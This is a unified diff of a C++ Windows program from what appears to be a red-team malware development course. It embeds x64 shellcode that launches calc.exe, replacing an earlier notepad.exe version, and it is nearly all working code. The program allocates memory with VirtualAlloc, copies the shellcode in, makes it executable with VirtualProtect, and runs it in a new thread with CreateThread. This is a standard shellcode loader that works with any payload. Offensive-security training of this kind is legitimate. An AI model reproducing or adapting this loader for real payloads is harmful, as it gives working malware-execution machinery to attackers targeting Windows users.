@@ -1,15 +1,15 @@
-// MalDev.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
+/*
 
+ Red Team Operator course code template
+ author: reenz0h (twitter: @sektor7net)
 
+*/
 #include <windows.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <stdio.h>
-#include <Windows.h>
 
-
-unsigned char payload[] = {
+unsigned char calc_payload[] = {
   0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
   0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
   0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
@@ -32,44 +32,34 @@ unsigned char payload[] = {
   0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
   0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
   0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
-  0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2e, 0x65,
-  0x78, 0x65, 0x00
+  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
 };
-unsigned int payload_len = 279;
+unsigned int calc_len = 276;
 
-int main(void)
-{
-    void* exec_mem;
-    BOOL rv;
-    HANDLE th;
-    DWORD oldprotect = 0;
 
-    //Alocate the memory buffer
-    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    printf("%-20s : 0x%-016p\n", "payload addr", (void*)payload);
-    printf("%-20s : 0x%-016p\n", "exec_mem Addr", (void*)exec_mem);
+int main(void) {
 
-    printf("The length of payload %d", payload_len);
-    printf("Payload is %s\n", payload);
-    RtlMoveMemory(exec_mem, payload, payload_len);
+	void* payload_mem;
+	BOOL rv;
+	HANDLE th;
+	DWORD oldprotect = 0;
 
-    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+	payload_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("%-20s : 0x%-016p\n", "payload addr", (void*)calc_payload);
+	printf("%-20s : 0x%-016p\n", "payload_mem addr", (void*)payload_mem);
 
-    if (rv != 0) {
-        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
-        WaitForSingleObject(th, -1);
-    }
 
-    return 0;
+	RtlMoveMemory(payload_mem, calc_payload, calc_len);
+
+	rv = VirtualProtect(payload_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("\nHit me!\n");
+	getchar();
+
+	if (rv != 0) {
+		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload_mem, 0, 0, 0);
+		WaitForSingleObject(th, -1);
+	}
+
+	return 0;
 }
-
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
